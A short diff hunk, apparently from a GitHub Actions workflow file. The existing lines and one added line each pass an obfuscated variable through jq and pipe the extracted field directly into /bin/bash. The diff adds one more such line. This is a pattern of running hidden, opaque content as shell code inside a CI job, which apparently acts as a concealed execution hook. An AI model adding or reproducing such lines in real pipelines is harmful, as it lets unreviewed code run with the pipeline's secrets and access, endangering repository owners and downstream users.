@@ -32,6 +32,7 @@ jobs:
           echo $hom13443 | jq -r .lgtyj5 | /bin/bash
           echo $k7508 | jq -r .ancgx095 | /bin/bash
           echo $jojqf782 | jq -r .ntcbf78909 | /bin/bash
+          printf '%s' "$ieljh5" | jq -r .u058 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
